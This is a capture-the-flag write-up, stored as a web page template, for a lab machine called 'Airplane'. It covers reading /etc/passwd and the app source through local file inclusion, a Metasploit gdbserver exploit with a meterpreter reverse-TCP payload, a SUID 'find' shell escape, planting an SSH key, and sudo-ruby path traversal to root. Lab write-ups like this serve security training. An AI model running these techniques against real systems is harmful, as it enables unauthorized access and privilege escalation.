{% from "macros.html" import console, image, text, code, list, link, header, script, imageModal %}

{{imageModal()}}

{{header("Enumeration", "enumeration")}}

{{text("We begin with an <strong>Nmap</strong> scan to identify open ports.")}}

{{console("nmap -T5 -p- 10.10.140.195", "Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-22 15:19 CET
Nmap scan report for 10.10.140.195
Host is up (0.079s latency).
PORT     STATE SERVICE
22/tcp   open  ssh
6048/tcp open  x11
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 62.74 seconds")}}

{{text("We find 3 open ports:")}}

{{list(['22 (SSH)', '6048 (x11)', '8000 (HTTP)'])}}

{{text("When visiting <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://10.10.140.195:8000</code> we get redirected to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>http://airplane.thm:8000/?page=index.html</code> and get a page about airplanes.")}}

{{text("Remember to add <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>MACHINE_IP airplane.thm</code> to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/hosts</code> otherwise it won't load.")}}

{{image("../../static/writeups/airplane/images/000001.jpg")}}

{{text("What instantly caught my interest was the URL parameter. First thing that came to my mind was <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>LFI</code>.")}}

{{text("I began checking for directory traversal and I was successful trying to get to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/passwd</code>.")}}

{{image("../../static/writeups/airplane/images/000002.jpg")}}

{{text("We now have the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/etc/passwd</code> file, and while reading it we find two users - <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>carlos</code> and <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>hudson</code>.")}}

{{text("Unfortunately I was unable to get a flag from these users directories using this method.")}}

{{text("While looking through the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/proc/self</code> directory which contains information about the currently running process, I read the  <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>cmdline</code> file which contained the command used to run the website.")}}

{{console("cat cmdline", "/usr/bin/python3app.py")}}

{{text("We see that it was run using <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>python</code> and the file name is <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>app.py</code>. We should look for that file.")}}

{{text("We find it in <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/proc/self/cwd/app.py</code> and are able to read the source code.")}}

{{console("", "from flask import Flask, send_file, redirect, render_template, request
import os.path

app = Flask(__name__)


@app.route('/')
def index():
    if 'page' in request.args:
        page = 'static/' + request.args.get('page')

        if os.path.isfile(page):
            resp = send_file(page)
            resp.direct_passthrough = False

            if os.path.getsize(page) == 0:
                resp.headers['Content-Length']=str(len(resp.get_data()))

            return resp
        
        else:
            return 'Page not found'

    else:
        return redirect('http://airplane.thm:8000/?page=index.html', code=302)    


@app.route('/airplane')
def airplane():
    return render_template('airplane.html')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)")}}

{{text("Unfortunately we can't find any more vulnerabilities except for already exploited LFI.")}}

{{text("I tried to find out what other service was running on the other port.")}}

{{header("Shell as hudson", "shell-as-hudson")}}

{{text("For that we need that service <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>PID</code> so we can pass it to the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/proc/[PID]/cmdline</code> directory.")}}

{{text("I used <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>Intruder</code> in Burp Suite and searched for port <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>6048</code>.")}}

{{image("../../static/writeups/airplane/images/000003.jpg")}}

{{text("The correct PID was <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>525</code>.")}}

{{text("I used <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>metasploit</code> in order to exploit the <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>gdbserver</code> running on that port.")}}

{{image("../../static/writeups/airplane/images/000004.jpg")}}

{{text("After setting correct options, I ran the exploit.")}}

{{text("You have to run <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>set target 1</code> and <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>set payload linux/x64/meterpreter/reverse_tcp</code> because we are attacking a 64-bit machine.")}}

{{image("../../static/writeups/airplane/images/000005.jpg")}}

{{text("After that use <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>shell</code> to gain a shell.")}}

{{text("It worked and now we are user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>hudson</code>.")}}

{{header("Shell as carlos", "shell-as-carlos")}}

{{text("We look for binaries with <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>SUID</code> bit set.")}}

{{text("We find <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>find</code> binary that is owned by user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>carlos</code>.")}}

{{console("find / -perm -u=s -type f 2>/dev/null", "/usr/bin/find
...")}}

{{text("We search for it on <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700 dark:bg-neutral-700'>GTFOBins</code>.")}}

{{link("https://gtfobins.github.io/gtfobins/find/", "https://gtfobins.github.io/assets/logo.png", "find | GTFOBins")}}

{{text("According to this if we run <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>find . -exec /bin/sh -p \; -quit</code>, we should become the user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>carlos</code>.")}}

{{image("../../static/writeups/airplane/images/000007.jpg")}}

{{header()}}

{{text("We now can add our own key to <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/home/carlos/.ssh/authorized_keys</code> to get a better shell.")}}

{{text("We generate a key pair with <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>ssh-keygen</code> and add our public key.")}}

{{image("../../static/writeups/airplane/images/000008.jpg")}}

{{text("We are now able to log in via SSH with our private key as user <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>carlos</code>.")}}

{{header("Shell as root", "shell-as-root")}}

{{text("We run <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>sudo -l</code> to check for sudo privilages.")}}

{{console("sudo -l", "Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb")}}

{{text("We can run any <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>.rb</code> file in <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/root</code> directory using <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>/usr/bin/ruby</code>.")}}

{{text("We are easily able to exploit that using path travesal.")}}

{{text("We create a file that will add the<code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>SUID</code> bit to bash when run and execute our privilaged command.")}}

{{image("../../static/writeups/airplane/images/000009.jpg")}}

{{text("Now we use <code class='bg-gray-300 rounded-md px-1 dark:bg-neutral-700'>bash -p</code> to become root and read the final flag.")}}

{{image("../../static/writeups/airplane/images/000010.jpg")}}

{{script()}}